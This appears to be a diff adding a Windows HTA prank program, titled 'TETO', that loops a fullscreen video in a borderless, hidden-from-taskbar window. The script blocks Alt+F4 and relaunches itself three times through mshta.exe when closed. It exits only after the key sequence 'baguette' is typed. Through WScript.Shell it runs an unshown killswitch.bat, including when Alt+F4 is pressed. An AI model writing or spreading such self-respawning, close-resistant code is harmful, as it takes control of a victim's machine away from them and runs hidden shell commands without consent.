@@ -1,0 +1,110 @@
+<html>
+<head>
+  <title>TETO</title>
+  <hta:application 
+    border="none"
+    caption="no"
+    showInTaskbar="no"
+    sysmenu="no"
+    scroll="no" />
+  <style>
+    html, body {
+      margin: 0; padding: 0; overflow: hidden;
+      width: 100%; height: 100%;
+      background-color: black;
+    }
+    video, object {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <object id="mediaPlayer" width="100%" height="100%"
+    classid="CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6"
+    type="application/x-oleobject">
+    <param name="URL" value="teto.mp4" />
+    <param name="autoStart" value="true" />
+    <param name="loop" value="true" />
+    <param name="uiMode" value="none" />
+  </object>
+
+<script type="text/javascript">
+  var sequence = ['b','a','g','u','e','t','t','e'];
+  var input = [];
+  var canClose = false;
+
+  document.onkeydown = function(e) {
+    e = e || window.event;
+    var key = e.key || String.fromCharCode(e.keyCode || e.which);
+    input.push(key.toLowerCase());
+
+    if (input.length > sequence.length) input.shift();
+
+    if (input.join('') === sequence.join('')) {
+      canClose = true;
+
+      try {
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run('killswitch.bat', 0, false);
+      } catch(err) {
+        alert('Failed to run killswitch.bat');
+      }
+
+      window.close();
+    }
+
+    // alt+f4 detection (altKey + F4 keyCode 115)
+    if (e.altKey && (e.keyCode === 115 || e.which === 115)) {
+      if (!canClose) {
+        try {
+          var shell = new ActiveXObject("WScript.Shell");
+          var path = location.pathname;
+          for (var i = 0; i < 3; i++) {
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var folder = fso.GetParentFolderName(location.pathname);
+            var batPath = folder + "\\killswitch.bat";
+            shell.Run('"' + batPath + '"', 0, false);
+
+          }
+        } catch(e) {
+          // fallback - maybe alert or ignore
+        }
+        return false; // prevent default alt+f4 close
+      }
+    }
+  };
+
+  window.onbeforeunload = function(e) {
+    if (!canClose) {
+      try {
+        var shell = new ActiveXObject("WScript.Shell");
+        var path = location.pathname;
+        for (var i = 0; i < 3; i++) {
+          shell.Run('mshta.exe "' + path + '"', 0, false);
+        }
+      } catch(e) {
+        // fallback or ignore
+      }
+      e.returnValue = false;
+      return false;
+    }
+  };
+    function randomizePosition() {
+    var screenWidth = screen.availWidth;
+    var screenHeight = screen.availHeight;
+
+    // random x and y but keep window fully visible assuming 800x600 window size
+    var x = Math.floor(Math.random() * (screenWidth - 800));
+    var y = Math.floor(Math.random() * (screenHeight - 600));
+
+    window.moveTo(x, y);
+  }
+
+  window.onload = function() {
+    randomizePosition();
+  };
+</script>
+</body>
+</html>
